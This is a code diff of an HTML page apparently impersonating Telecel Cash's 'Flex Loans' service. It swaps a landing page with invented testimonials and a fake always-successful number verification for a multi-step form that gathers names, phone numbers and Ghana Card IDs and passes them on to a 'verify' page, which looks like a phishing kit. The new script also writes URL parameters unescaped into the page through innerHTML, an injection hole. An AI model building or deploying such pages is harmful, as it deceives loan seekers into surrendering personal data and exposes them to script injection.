@@ -3,426 +3,280 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Telecel Cash | Flex Loans - Instant Cash</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <title>Apply for Flex Loan - Telecel Cash</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
     <style>
         :root {
-            --red: #E42320;
-            --dark: #0a0a0a;
-            --gray: #1a1a1a;
-            --accent-green: #00A651;
-            --blue: #00A3FF;
+            --telecel-red: #E42320;
+            --telecel-red-hover: #c41e1b;
+            --dark: #1a1a1a;
+            --text-gray: #4a5568;
+            --glass-bg: rgba(255, 255, 255, 0.88);
         }
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
-        body { background: #0a0a0a; color: #e5e5e5; line-height: 1.6; }
-
-        /* Sticky Ticker */
-        .ticker-wrap {
-            background: #000; color: white; padding: 12px 0; overflow: hidden; white-space: nowrap;
-            border-bottom: 5px solid var(--red); position: sticky; top: 0; z-index: 1100;
+        body {
+            background: linear-gradient(135deg, #f8f9fa, #f0f4f8);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            position: relative;
         }
-        .ticker-inner { display: inline-flex; animation: ticker 25s linear infinite; }
-        .ticker-inner span { margin-right: 80px; font-size: 1.05rem; font-weight: 500; }
-        @keyframes ticker { 0% { transform: translateX(0); } 100% { transform: translateX(-50%); } }
-
-        /* Header */
-        header {
-            background: var(--dark); position: sticky; top: 52px; z-index: 1000;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.7);
+        .orb { 
+            position: fixed; 
+            border-radius: 50%; 
+            filter: blur(90px); 
+            z-index: -1; 
+            opacity: 0.25; 
         }
-        .nav-content {
-            max-width: 1400px; margin: 0 auto; padding: 16px 5%;
-            display: flex; align-items: center; justify-content: space-between;
+        .orb-1 { width: 450px; height: 450px; background: var(--telecel-red); top: -15%; left: -10%; }
+        .orb-2 { width: 380px; height: 380px; background: #ff6b5e; bottom: -10%; right: -10%; }
+
+        .form-container {
+            background: var(--glass-bg);
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(255,255,255,0.9);
+            box-shadow: 0 20px 60px rgba(228, 35, 32, 0.15);
+            max-width: 540px;
+            width: 100%;
+            border-radius: 28px;
+            padding: 40px 35px;
         }
-        .logo { display: flex; align-items: center; gap: 12px; color: white; text-decoration: none; }
-        .logo svg { width: 200px; height: 200px; }
-        .logo-text { font-size: 2.4rem; font-weight: 800; letter-spacing: -1.5px; }
-        .nav-links { display: flex; gap: 28px; font-weight: 600; align-items: center; }
-        .nav-links a { color: #ddd; text-decoration: none; transition: 0.3s; }
-        .nav-links a:hover { color: white; }
-        .login-btn {
-            background: var(--blue); color: white; padding: 12px 28px; border-radius: 50px;
-            font-weight: 700; text-decoration: none; transition: 0.3s; white-space: nowrap;
+        .debug-box {
+            background: #fff0f0;
+            border: 1px solid #ffe0e0;
+            padding: 12px;
+            border-radius: 12px;
+            margin-bottom: 20px;
+            font-size: 14px;
+            transition: all 0.4s ease;
         }
-        .hamburger { display: none; font-size: 1.9rem; color: white; cursor: pointer; }
-
-        /* Mobile Menu */
-        #mobileMenu {
-            display: none; position: fixed; top: 52px; left: 0; width: 100%; height: calc(100vh - 52px);
-            background: rgba(10,10,10,0.98); z-index: 999; padding: 40px 20px; flex-direction: column;
-            gap: 25px; font-size: 1.4rem; font-weight: 600;
+        .form-header { text-align: center; margin-bottom: 35px; }
+        .form-header h2 { font-size: 28px; font-weight: 800; color: var(--dark); }
+        .progress-bar { display: flex; justify-content: center; gap: 10px; margin: 25px 0 35px; }
+        .progress-segment {
+            height: 6px; width: 80px; background: #e5e7eb; border-radius: 10px;
         }
-        #mobileMenu a { color: #ddd; text-decoration: none; padding: 12px 0; border-bottom: 1px solid #333; }
-
-        /* Hero */
-        .hero {
-            background: linear-gradient(rgba(10,10,10,0.82), rgba(10,10,10,0.88)), 
-                        url('https://images.unsplash.com/photo-1556742049-0cfed4f6a45d?ixlib=rb-4.0.3&auto=format&fit=crop&q=80') center/cover no-repeat;
-            color: white; padding: 140px 5% 100px; text-align: center;
+        .progress-segment.active { background: var(--telecel-red); }
+        .form-step { display: none; }
+        .form-step.active { display: block; }
+        .form-group { margin-bottom: 24px; }
+        label { display: block; font-weight: 600; color: var(--text-gray); margin-bottom: 8px; }
+        .form-control {
+            width: 100%; padding: 14px 16px; border: 2px solid #e5e7eb;
+            border-radius: 14px; font-size: 16px;
         }
-        .hero h1 { font-size: clamp(2.6rem, 6.5vw, 4rem); font-weight: 800; margin-bottom: 16px; }
-        .hero p { font-size: 1.25rem; max-width: 700px; margin: 0 auto 35px; opacity: 0.95; }
-
-        /* Calculator */
-        .estimator {
-            max-width: 720px; margin: -80px auto 80px; background: var(--gray);
-            padding: 55px 50px; border-radius: 28px; border: 1px solid #333;
-            box-shadow: 0 25px 60px rgba(0,0,0,0.5);
+        .form-control:focus { border-color: var(--telecel-red); outline: none; }
+        .button-group { display: flex; gap: 12px; margin-top: 30px; }
+        .btn {
+            flex: 1; padding: 16px; border-radius: 14px; font-weight: 700;
+            cursor: pointer; border: none; font-size: 16px;
         }
-        .estimator h2 { text-align:center; margin-bottom:40px; color:var(--red); font-size: 2rem; }
-
-        .form-group { margin-bottom: 32px; }
-        label { display: block; font-weight: 600; margin-bottom: 12px; color: #ddd; font-size: 1.1rem; }
-        input[type="range"] { width: 100%; accent-color: var(--red); height: 8px; border-radius: 10px; }
-        .slider-value { text-align: center; font-size: 2.4rem; font-weight: 800; color: white; margin: 18px 0; }
-
-        .result { background: #1f1f1f; padding: 45px 35px; border-radius: 22px; text-align: center; margin: 35px 0; border: 2px solid #333; }
-        .receive-text { font-size: 1.3rem; margin-bottom: 8px; color: var(--blue); font-weight: 700; }
-        .receive-amount { font-size: 2.4rem; font-weight: 800; color: #fff; }
-        .amount-repay { font-size: 2.1rem; font-weight: 800; color: var(--accent-green); margin: 18px 0 8px; }
-        .interest-rate { font-size: 1.2rem; color: #aaa; }
-
-        .btn-proceed {
-            width: 100%; background: linear-gradient(90deg, var(--red), #c41e1b);
-            color: white; border: none; padding: 22px; font-size: 1.35rem;
-            font-weight: 700; border-radius: 50px; cursor: pointer; margin-top: 15px;
-            box-shadow: 0 10px 25px rgba(228, 35, 32, 0.4);
-        }
-
-        .section { padding: 100px 5%; }
-        .section-title { text-align: center; font-size: 2.7rem; margin-bottom: 60px; font-weight: 800; color: white; }
-
-        .packages-grid {
-            display: grid; grid-template-columns: repeat(auto-fit, minmax(340px, 1fr)); gap: 30px;
-            max-width: 1400px; margin: 0 auto;
-        }
-
-        .package-card {
-            background: var(--gray); padding: 38px 28px; border-radius: 24px;
-            border: 1px solid #333; transition: all 0.4s ease; text-align: center;
-        }
-        .package-card:hover { transform: translateY(-12px); border-color: var(--red); }
-
-        .package-amount { font-size: 1.85rem; font-weight: 700; color: var(--red); margin: 18px 0; }
-        .get-loan-btn {
-            width: 100%; background: var(--red); color: white; border: none;
-            padding: 18px; font-size: 1.15rem; font-weight: 700; border-radius: 50px; cursor: pointer;
-            transition: all 0.3s;
-        }
-        .get-loan-btn:hover { background: #c41e1b; transform: scale(1.05); }
-
-        footer { background: #111; color: #bbb; padding: 90px 5% 50px; }
-        .footer-content { max-width: 1400px; margin: 0 auto; display: grid; grid-template-columns: repeat(auto-fit, minmax(240px, 1fr)); gap: 50px; }
-
-        /* Modals */
-        .modal {
-            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.92); z-index: 2000; align-items: center; justify-content: center;
-        }
-        .modal-content {
-            background: #1f1f1f; max-width: 460px; width: 92%; border-radius: 28px;
-            padding: 40px 32px; text-align: center; border: 3px solid var(--red);
-            box-shadow: 0 20px 60px rgba(0,0,0,0.6);
-        }
-        .success-icon { font-size: 4.5rem; color: var(--accent-green); margin-bottom: 20px; }
-
-        @media (max-width: 768px) {
-            .nav-links { display: none; }
-            .hamburger { display: block; }
-            .hero { padding: 120px 5% 90px; }
-            .estimator { margin: -60px 20px 60px; padding: 40px 25px; }
-            .logo svg { width: 140px; height: 140px; }
+        .btn-primary { background: var(--telecel-red); color: white; }
+        .btn-secondary { background: #f3f4f6; color: #4b5563; }
+        .error-message {
+            color: #dc3545;
+            font-size: 14px;
+            margin-top: 8px;
+            display: none;
         }
     </style>
 </head>
 <body>
+    <div class="orb orb-1"></div>
+    <div class="orb orb-2"></div>
 
-    <!-- Sticky Ticker -->
-    <div class="ticker-wrap">
-        <div class="ticker-inner">
-            <span>🔥 Instant Approval • Money in Minutes</span>
-            <span>✅ No Collateral • Only Active Telecel Line Needed</span>
-            <span>📱 Apply in 60 Seconds • Funds to Telecel Cash</span>
-        </div>
-    </div>
-
-    <!-- Header -->
-    <header>
-        <div class="nav-content">
-            <a href="#home" class="logo">
-                <svg width="200" height="200" viewBox="0 0 96 96" fill="none" xmlns="http://www.w3.org/2000/svg">
-                    <path d="M48.19 28.6833C40.4333 28.605 34.1983 34.9933 34.2183 42.58C34.2383 50.625 40.9883 56.56 48.0333 56.4317C55.5033 56.5017 61.8867 50.53 61.9517 42.7583C62.02 34.62 55.575 28.76 48.19 28.6833ZM53.7333 38.1633C53.6017 39.2783 52.9467 39.9367 51.93 40.29C51.3683 40.4867 50.7833 40.4917 50.195 40.4917C49.8333 40.49 49.4683 40.46 49.1067 40.5183C48.8467 40.5617 48.7033 40.6917 48.6667 40.97C48.6133 41.3467 48.6917 41.7133 48.6883 42.085C48.6867 43.6083 48.6883 45.135 48.6867 46.6583C48.6867 46.9117 48.7133 47.1617 48.7667 47.4067C48.9833 48.3783 49.7917 48.955 50.7817 48.8333C51.5417 48.7383 52.31 48.7333 53.0733 48.6683C53.3933 48.6417 53.495 48.7833 53.4717 49.1233C53.435 49.6333 53.4383 50.1433 53.47 50.655C53.535 51.715 53.0383 52.4717 52.1333 52.8467C49.6867 53.8583 47.2717 53.835 45.065 52.2417C43.8517 51.3667 43.2033 50.115 43.1333 48.57C43.0467 46.585 43.0117 44.6 42.9517 42.6117C42.8883 40.605 42.9083 38.5967 42.9233 36.59C42.9333 35.2433 43.5583 34.15 44.5517 33.265C45.1033 32.7717 45.7183 32.37 46.3867 32.05C46.9933 31.7583 47.6283 31.6483 48.295 31.6583C48.5333 31.6633 48.6233 31.7533 48.6467 31.9983C48.7117 32.6333 48.68 33.27 48.6933 33.8517C48.6933 34.3667 48.6883 34.8317 48.6933 35.295C48.695 35.6983 48.8383 35.845 49.2467 35.905C49.5283 35.9483 49.8083 35.9117 50.09 35.91C51.06 35.8983 52.0267 35.8983 52.9967 35.905C53.5683 35.9117 53.745 36.0867 53.7283 36.6517C53.7117 37.1567 53.7967 37.655 53.7383 38.1633H53.7333Z" fill="#E32526"/>
-                </svg>
-                <div class="logo-text">Telecel</div>
-            </a>
-            <div class="nav-links">
-                <a href="#home">Home</a>
-                <a href="#loans">Loans</a>
-                <a href="#benefits">Benefits</a>
-                <a href="#how">How it Works</a>
-                <a href="#testimonials">Testimonials</a>
-                <a href="#faq">FAQ</a>
-            </div>
-            <a href="#" onclick="showLoginModal()" class="login-btn">Login / Verify</a>
-            <div class="hamburger" onclick="toggleMobileMenu()">☰</div>
-        </div>
-    </header>
-
-    <!-- Mobile Menu -->
-    <div id="mobileMenu">
-        <a href="#home" onclick="closeMobileMenu()">Home</a>
-        <a href="#loans" onclick="closeMobileMenu()">Loans</a>
-        <a href="#benefits" onclick="closeMobileMenu()">Benefits</a>
-        <a href="#how" onclick="closeMobileMenu()">How it Works</a>
-        <a href="#testimonials" onclick="closeMobileMenu()">Testimonials</a>
-        <a href="#faq" onclick="closeMobileMenu()">FAQ</a>
-        <a href="#" onclick="logoutUser()" style="color:#ff6666;">Logout</a>
-    </div>
-
-    <!-- Hero -->
-    <section class="hero" id="home">
-        <h1>Instant Flex Loans for Telecel Customers</h1>
-        <p>As a loyal Telecel user, you qualify for fast, collateral-free loans. Get money directly into your Telecel Cash wallet in minutes.</p>
-        <button onclick="document.getElementById('estimator').scrollIntoView({behavior:'smooth'})"
-                style="background:white; color:#000; padding:18px 48px; font-size:1.3rem; font-weight:700; border:none; border-radius:50px; cursor:pointer;">
-            Check My Eligibility →
-        </button>
-    </section>
-
-    <!-- Calculator -->
-    <div class="estimator" id="estimator">
-        <h2>Quick Loan Calculator</h2>
-        <div class="form-group">
-            <label>Loan Amount (GHS) — <span id="sliderValue">5000</span></label>
-            <input type="range" id="amountSlider" min="500" max="25000" value="5000" step="100" oninput="updateFromSlider()">
-        </div>
-        <div class="form-group">
-            <label>Repayment Period</label>
-            <select id="duration" onchange="calculateRepayment()" style="padding:18px; font-size:1.15rem; width:100%; background:#222; color:white; border:1px solid #444; border-radius:12px;">
-                <option value="7">7 Days</option>
-                <option value="14">14 Days</option>
-                <option value="30" selected>30 Days - Most Popular</option>
-                <option value="60">60 Days</option>
-                <option value="90">90 Days</option>
-            </select>
-        </div>
-        <div class="result">
-            <p class="receive-text">You will receive</p>
-            <p class="receive-amount" id="receive">GHS 5,000</p>
-            <p class="amount-repay">Total to Repay: <span id="repay" style="color:var(--accent-green);">GHS 5,445</span></p>
-            <p id="interestRate" style="margin-top:15px; font-size:1.2rem;">Interest Rate: <strong style="color:var(--accent-green);">8.9%</strong></p>
-        </div>
-        <button class="btn-proceed" onclick="showConfirmModal()">Proceed to Apply →</button>
-    </div>
-
-    <!-- Other Sections -->
-    <section id="loans" class="section">
-        <h2 class="section-title">Popular Loan Packages</h2>
-        <div class="packages-grid">
-            <div class="package-card">
-                <h3>🚨 Emergency Loan</h3>
-                <p class="package-amount">GHS 1,000 - 5,000</p>
-                <button class="get-loan-btn" onclick="quickApply(3000, 14, 'Emergency')">Get This Loan</button>
-            </div>
-            <div class="package-card">
-                <h3>💼 Business Boost</h3>
-                <p class="package-amount">GHS 5,000 - 20,000</p>
-                <button class="get-loan-btn" onclick="quickApply(10000, 30, 'Business')">Get This Loan</button>
-            </div>
-            <div class="package-card">
-                <h3>🎓 School Fees</h3>
-                <p class="package-amount">GHS 2,000 - 8,000</p>
-                <button class="get-loan-btn" onclick="quickApply(5000, 30, 'Education')">Get This Loan</button>
+    <div class="form-container">
+        <div class="form-header">
+            <h2>Telecel Cash Flex Loan</h2>
+            <p>Instant approval • Funds in minutes</p>
+            <div class="progress-bar">
+                <div class="progress-segment active" id="prog-1"></div>
+                <div class="progress-segment" id="prog-2"></div>
+                <div class="progress-segment" id="prog-3"></div>
             </div>
         </div>
-    </section>
 
-    <section id="benefits" class="section" style="background:#111;">
-        <h2 class="section-title">Why Choose Telecel Loans?</h2>
-        <div class="packages-grid">
-            <div class="benefit-card"><h3>⚡ Instant Disbursement</h3><p>Money lands in your Telecel Cash Wallet within minutes of approval.</p></div>
-            <div class="benefit-card"><h3>🔒 No Collateral Required</h3><p>Just your active Telecel line and good usage history.</p></div>
-            <div class="benefit-card"><h3>📱 100% Mobile Experience</h3><p>Apply, get approved, and repay directly from your phone.</p></div>
-            <div class="benefit-card"><h3>🔄 Flexible Repayment</h3><p>Choose from 7 to 90 days with transparent rates.</p></div>
-            <div class="benefit-card"><h3>🛡️ Secure & Trusted</h3><p>Powered by Telecel Ghana. Your data is protected.</p></div>
-            <div class="benefit-card"><h3>⭐ Loyal Users Rewarded</h3><p>Higher limits for consistent Telecel users.</p></div>
+        <!-- Debug Box -->
+        <div class="debug-box" id="debugInfo">
+            <strong>📥 Received from Index:</strong><br>
+            <span id="debugText">Loading...</span>
         </div>
-    </section>
 
-    <section id="how" class="section">
-        <h2 class="section-title">How It Works</h2>
-        <div class="packages-grid">
-            <div class="package-card"><h3>1. Choose Amount</h3><p>Use our calculator or select a package.</p></div>
-            <div class="package-card"><h3>2. Quick Verification</h3><p>Confirm your Telecel number and basic details.</p></div>
-            <div class="package-card"><h3>3. Get Cash Instantly</h3><p>Funds transferred directly to your Telecel Cash wallet.</p></div>
-        </div>
-    </section>
-
-    <section id="testimonials" class="section" style="background:#111;">
-        <h2 class="section-title">What People Say</h2>
-        <div class="packages-grid">
-            <div class="testimonial-card"><p>"Got GHS 8,000 in under 15 minutes. Life saver for my business!"</p><strong>— Ama Mensah, Accra</strong></div>
-            <div class="testimonial-card"><p>"Super easy process. Paid school fees same day. Thank you Telecel!"</p><strong>— Kwame Ofori, Kumasi</strong></div>
-            <div class="testimonial-card"><p>"Best loan service in Ghana. No stress, transparent and fast."</p><strong>— Fatima Ibrahim, Tamale</strong></div>
-            <div class="testimonial-card"><p>"I applied at night and money was in my wallet before morning."</p><strong>— Daniel Asante, Takoradi</strong></div>
-        </div>
-    </section>
-
-    <section id="faq" class="section">
-        <h2 class="section-title">Frequently Asked Questions</h2>
-        <div class="packages-grid" style="grid-template-columns:1fr; max-width:900px; margin:auto;">
-            <div class="faq-item"><div class="faq-question" onclick="toggleFAQ(this)">Who can apply? <span>+</span></div><div class="faq-answer">Active Telecel users with consistent airtime and data usage for at least 3 months.</div></div>
-            <div class="faq-item"><div class="faq-question" onclick="toggleFAQ(this)">How fast do I get the money? <span>+</span></div><div class="faq-answer">Approved loans are disbursed within 5-30 minutes directly to your Telecel Cash wallet.</div></div>
-            <div class="faq-item"><div class="faq-question" onclick="toggleFAQ(this)">What are the interest rates? <span>+</span></div><div class="faq-answer">Rates range from 8% to 15% depending on loan amount and duration. No hidden fees.</div></div>
-            <div class="faq-item"><div class="faq-question" onclick="toggleFAQ(this)">Can I repay early? <span>+</span></div><div class="faq-answer">Yes! Early repayment is encouraged and may reduce total interest.</div></div>
-        </div>
-    </section>
-
-    <!-- Footer -->
-    <footer>
-        <div class="footer-content">
-            <div>
-                <div class="footer-logo">Telecel Cash</div>
-                <p>Instant financial solutions for Telecel customers across Ghana.</p>
+        <form id="loanForm">
+            <!-- Step 1: Loan Details -->
+            <div class="form-step active" id="step-1">
+                <div class="form-group">
+                    <label>Loan Amount (GHS)</label>
+                    <input type="number" class="form-control" id="loanAmount" placeholder="5000" min="500" max="25000" required>
+                </div>
+                <div class="form-group">
+                    <label>Loan Duration (Days)</label>
+                    <select class="form-control" id="duration" required>
+                        <option value="">Select Duration</option>
+                        <option value="7">7 Days</option>
+                        <option value="14">14 Days</option>
+                        <option value="30">30 Days</option>
+                        <option value="60">60 Days</option>
+                        <option value="90">90 Days</option>
+                    </select>
+                </div>
+                <div class="form-group">
+                    <label>Loan Purpose</label>
+                    <select class="form-control" id="purpose" required>
+                        <option value="">Select Purpose</option>
+                        <option value="Emergency">Emergency Needs</option>
+                        <option value="Business">Business / Trading</option>
+                        <option value="Medical">Medical Bills</option>
+                        <option value="Education">School Fees</option>
+                        <option value="Personal">Personal Use</option>
+                        <option value="Other">Other</option>
+                    </select>
+                </div>
+                <div class="button-group">
+                    <button type="button" class="btn btn-primary" onclick="nextStep(1)">Continue <i class="fa-solid fa-arrow-right"></i></button>
+                </div>
             </div>
-            <div>
-                <h4>Quick Links</h4>
-                <p>Home<br>Loans<br>Benefits<br>How it Works</p>
-            </div>
-            <div>
-                <h4>Support</h4>
-                <p>FAQ<br>Contact Us<br>Terms &amp; Conditions</p>
-            </div>
-            <div>
-                <h4>Legal</h4>
-                <p>Privacy Policy<br>Responsible Lending</p>
-            </div>
-        </div>
-        <div style="text-align:center; margin-top:80px; padding-top:30px; border-top:1px solid #333; color:#666;">
-            © 2026 Telecel Ghana • All Rights Reserved
-        </div>
-    </footer>
 
-    <!-- Confirmation Modal -->
-    <div class="modal" id="confirmModal">
-        <div class="modal-content">
-            <h3>Confirm Your Loan Details</h3>
-            <p><strong>Amount to Receive:</strong> <span id="modalReceive" style="color:var(--blue);"></span></p>
-            <p><strong>Total to Repay:</strong> <span id="modalRepay" style="color:var(--accent-green); font-size:1.4rem;"></span></p>
-            <p><strong>Duration:</strong> <span id="modalDuration"></span> Days</p>
-            <button onclick="confirmProceed()" style="margin:30px 12px 12px; padding:18px 60px; background:var(--red); color:white; border:none; border-radius:50px; font-weight:700; font-size:1.1rem;">Yes, Apply Now</button>
-            <button onclick="closeModal()" style="padding:18px 50px; background:transparent; color:#ccc; border:2px solid #555; border-radius:50px;">Cancel</button>
-        </div>
-    </div>
+            <!-- Step 2: Personal Info -->
+            <div class="form-step" id="step-2">
+                <div class="form-group">
+                    <label>Full Name</label>
+                    <input type="text" class="form-control" id="fullName" placeholder="Kwame Mensah" required>
+                </div>
+                <div class="form-group">
+                    <label>Telecel Phone Number</label>
+                    <input type="tel" class="form-control" id="phone" placeholder="0501234567" maxlength="10" required>
+                </div>
+                <div class="form-group">
+                    <label>Ghana Card ID (Optional)</label>
+                    <input type="text" class="form-control" id="idNumber" placeholder="GHA-123456789-0">
+                </div>
+                <div class="button-group">
+                    <button type="button" class="btn btn-secondary" onclick="prevStep(2)">Back</button>
+                    <button type="button" class="btn btn-primary" onclick="nextStep(2)">Next Step</button>
+                </div>
+            </div>
 
-    <!-- Success Modal -->
-    <div class="modal" id="successModal">
-        <div class="modal-content" style="border-color: var(--accent-green);">
-            <i class="fas fa-check-circle success-icon"></i>
-            <h3 style="color:var(--accent-green);">Application Started Successfully!</h3>
-            <p id="successDetails" style="margin:20px 0; font-size:1.1rem;"></p>
-            <button onclick="proceedToApply()" style="margin-top:20px; padding:18px 60px; background:var(--accent-green); color:black; border:none; border-radius:50px; font-weight:700;">Proceed to Application</button>
-        </div>
-    </div>
-
-    <!-- Login Modal -->
-    <div class="modal" id="loginModal">
-        <div class="modal-content">
-            <i class="fas fa-mobile-alt success-icon"></i>
-            <h3>Verify Your Telecel Number</h3>
-            <p style="margin:20px 0;">Enter your Telecel number to check eligibility and available limit</p>
-            <input type="tel" id="phoneInput" placeholder="054 XXX XXXX" style="width:100%; padding:18px; font-size:1.1rem; background:#222; border:1px solid #444; color:white; border-radius:12px; margin-bottom:25px; text-align:center;">
-            <button onclick="simulateVerification()" style="width:100%; padding:20px; background:var(--accent-green); color:black; border:none; border-radius:50px; font-weight:700; font-size:1.2rem;">Check My Limit</button>
-        </div>
+            <!-- Step 3: Summary -->
+            <div class="form-step" id="step-3">
+                <h4 style="color:var(--telecel-red); margin-bottom:15px;">Application Summary</h4>
+                <div style="background:#fff; padding:20px; border-radius:12px; border:1px solid #fee2e2;">
+                    <p><strong>Amount:</strong> <span id="sum-amount">-</span></p>
+                    <p><strong>Duration:</strong> <span id="sum-duration">-</span></p>
+                    <p><strong>Purpose:</strong> <span id="sum-purpose">-</span></p>
+                    <p><strong>Name:</strong> <span id="sum-name">-</span></p>
+                    <p><strong>Phone:</strong> <span id="sum-phone">-</span></p>
+                </div>
+                
+                <div id="submitError" class="error-message"></div>
+                <div class="button-group">
+                    <button type="button" class="btn btn-secondary" onclick="prevStep(3)">Back</button>
+                    <button type="button" class="btn btn-primary" id="submitBtn" onclick="submitApplication()">
+                        Confirm & Proceed to Verification →
+                    </button>
+                </div>
+            </div>
+        </form>
     </div>
 
     <script>
-        function updateFromSlider() {
-            const amount = document.getElementById('amountSlider').value;
-            document.getElementById('sliderValue').textContent = parseInt(amount).toLocaleString('en-US');
-            calculateRepayment();
+        function nextStep(current) {
+            if (current === 2) populateSummary();
+            document.getElementById(`step-${current}`).classList.remove('active');
+            document.getElementById(`step-${current+1}`).classList.add('active');
+            document.getElementById(`prog-${current+1}`).classList.add('active');
         }
 
-        function calculateRepayment() {
-            const amount = parseFloat(document.getElementById('amountSlider').value);
-            const days = parseInt(document.getElementById('duration').value);
-            let rate = 0.089;
-            if (days > 30) rate = 0.12;
-            if (days > 60) rate = 0.135;
-            const interest = Math.round(amount * rate * (days / 30));
-            const totalRepay = amount + interest;
-            document.getElementById('receive').textContent = `GHS ${amount.toLocaleString('en-US')}`;
-            document.getElementById('repay').textContent = `GHS ${totalRepay.toLocaleString('en-US')}`;
-            document.getElementById('interestRate').innerHTML = `Interest Rate: <strong style="color:var(--accent-green);">${(rate*100).toFixed(1)}%</strong>`;
+        function prevStep(current) {
+            document.getElementById(`step-${current}`).classList.remove('active');
+            document.getElementById(`step-${current-1}`).classList.add('active');
+            document.getElementById(`prog-${current}`).classList.remove('active');
         }
 
-        function showConfirmModal() {
-            const amount = document.getElementById('amountSlider').value;
-            const days = document.getElementById('duration').value;
-            const repayEl = document.getElementById('repay').textContent;
-            document.getElementById('modalReceive').textContent = `GHS ${parseInt(amount).toLocaleString('en-US')}`;
-            document.getElementById('modalRepay').textContent = repayEl;
-            document.getElementById('modalDuration').textContent = days;
-            document.getElementById('confirmModal').style.display = 'flex';
-        }
-
-        function closeModal() {
-            document.getElementById('confirmModal').style.display = 'none';
-            document.getElementById('loginModal').style.display = 'none';
-            document.getElementById('successModal').style.display = 'none';
-        }
-
-        function confirmProceed() {
-            closeModal();
-            const amount = document.getElementById('amountSlider').value;
+        function populateSummary() {
+            const amount = document.getElementById('loanAmount').value;
             const duration = document.getElementById('duration').value;
-            document.getElementById('successDetails').innerHTML = `Amount: <strong>GHS ${parseInt(amount).toLocaleString()}</strong><br>Duration: <strong>${duration} Days</strong>`;
-            document.getElementById('successModal').style.display = 'flex';
+            const purposeSelect = document.getElementById('purpose');
+            const purposeText = purposeSelect.options[purposeSelect.selectedIndex].text;
+
+            document.getElementById('sum-amount').textContent = amount ? `GHS ${parseFloat(amount).toLocaleString()}` : '-';
+            document.getElementById('sum-duration').textContent = duration ? `${duration} Days` : '-';
+            document.getElementById('sum-purpose').textContent = purposeText || '-';
+            document.getElementById('sum-name').textContent = document.getElementById('fullName').value || '-';
+            document.getElementById('sum-phone').textContent = document.getElementById('phone').value || '-';
         }
 
-        function proceedToApply() {
-            closeModal();
-            const amount = document.getElementById('amountSlider').value || 5000;
-            const duration = document.getElementById('duration').value || 30;
-            window.location.href = `apply.html?amount=${amount}&duration=${duration}&purpose=Personal`;
+        function submitApplication() {
+            const btn = document.getElementById('submitBtn');
+            const errorEl = document.getElementById('submitError');
+
+            const amount = document.getElementById('loanAmount').value;
+            const duration = document.getElementById('duration').value;
+            const purpose = document.getElementById('purpose').value;
+            const name = document.getElementById('fullName').value.trim();
+            const phone = document.getElementById('phone').value.trim();
+
+            if (!amount || !duration || !purpose || !name || !phone) {
+                errorEl.textContent = "Please fill in all required fields";
+                errorEl.style.display = 'block';
+                return;
+            }
+            if (phone.length !== 10) {
+                errorEl.textContent = "Phone number must be 10 digits";
+                errorEl.style.display = 'block';
+                return;
+            }
+
+            btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Processing...';
+            btn.disabled = true;
+
+            const params = new URLSearchParams({
+                amount: amount,
+                duration: duration,
+                purpose: purpose,
+                name: name,
+                phone: phone
+            });
+
+            setTimeout(() => {
+                window.location.href = `verify.html?${params.toString()}`;
+            }, 1300);
         }
 
-        function quickApply(amount, duration, purpose) {
-            document.getElementById('successDetails').innerHTML = `Amount: <strong>GHS ${amount}</strong><br>Purpose: <strong>${purpose}</strong>`;
-            document.getElementById('successModal').style.display = 'flex';
-        }
+        // Auto-fill from index.html
+        window.onload = () => {
+            const urlParams = new URLSearchParams(window.location.search);
+            let debugMsg = "";
 
-        function showLoginModal() {
-            document.getElementById('loginModal').style.display = 'flex';
-        }
+            if (urlParams.has('amount')) {
+                document.getElementById('loanAmount').value = urlParams.get('amount');
+                debugMsg += `Amount: GHS ${urlParams.get('amount')}<br>`;
+            }
+            if (urlParams.has('duration')) {
+                document.getElementById('duration').value = urlParams.get('duration');
+                debugMsg += `Duration: ${urlParams.get('duration')} Days<br>`;
+            }
+            if (urlParams.has('purpose')) {
+                document.getElementById('purpose').value = urlParams.get('purpose');
+                debugMsg += `Purpose: ${urlParams.get('purpose')}`;
+            }
 
-        function simulateVerification() {
-            const phone = document.getElementById('phoneInput').value;
-            if (phone.trim() === '') return alert("Please enter your Telecel number");
-            closeModal();
-            setTimeout(() => alert("✅ Verification Successful!\n\nEligible Limit: GHS 5,000 - 18,000"), 600);
-        }
+            document.getElementById('debugText').innerHTML = debugMsg || "No parameters received";
 
-        function toggleFAQ(el) {
-            const answer = el.nextElementSibling;
-            const isHidden = answer.style.display === 'none' || !answer.style.display;
-            answer.style.display = isHidden ? 'block' : 'none';
-            el.querySelector('span').textContent = isHidden ? '−' : '+';
-        }
+            setTimeout(() => {
+                document.getElementById('debugInfo').style.opacity = '0';
+            }, 4000);
+        };
 
-        function toggleMobileMenu() {
-            document.getElementById('mobileMenu').style.display = 'flex';
-        }
-        function closeMobileMenu() {
-            document.getElementById('mobileMenu').style.display = 'none';
-        }
-        function logoutUser() {
-            closeMobileMenu();
-            alert("✅ You have been logged out successfully.");
-        }
-
-        window.onload = () => calculateRepayment();
+        // Phone validation
+        document.getElementById('phone').addEventListener('input', function() {
+            let val = this.value.replace(/\D/g, '');
+            if (val.length > 10) val = val.substring(0, 10);
+            this.value = val;
+        });
     </script>
 </body>
 </html>
